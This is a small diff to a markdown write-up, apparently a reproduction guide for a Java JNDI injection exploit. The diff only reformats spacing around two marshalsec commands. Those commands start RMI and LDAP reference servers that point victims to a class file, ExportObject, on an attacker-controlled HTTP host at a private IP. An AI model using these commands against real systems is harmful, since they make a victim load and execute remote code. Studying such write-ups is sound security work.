@@ -71,10 +71,13 @@ public class ExportObject {
 ```
 
 ## RMI RefServer
+
 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.2.18:8000/#ExportObject`
 
 ## LDAP RefServer
+
 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.2.18:8000/#ExportObject`
+
 ![](./1.2.60.png)
 
 ## 参考链接：
